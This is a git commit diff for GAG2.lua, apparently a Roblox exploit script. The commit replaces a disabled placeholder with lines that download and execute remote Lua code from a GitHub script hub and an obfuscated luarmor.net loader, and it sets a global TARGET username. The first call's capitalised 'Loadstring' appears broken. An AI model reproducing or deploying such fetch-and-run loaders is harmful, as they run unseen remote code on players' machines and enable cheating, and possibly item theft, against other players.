474bab72dbead2154137f2d4901f4793f4f1f7b6
Truman1423 <jamman101213yt@gmail.com>
2026-06-17 14:01:22 -0700

    Update GAG2.lua

--- GAG2.lua
+++ GAG2.lua
@@ -1,1 +1,4 @@
-# Disabled
+Loadstring(game:HttpGet("https://raw.githubusercontent.com/genkascripts/ScriptHub/refs/heads/main/script"))()
+task.wait(0.5)
+getgenv().TARGET = "jamman101213"
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/41d1fa8b8c088dbe60de91d7e1a0d5cb.lua"))()
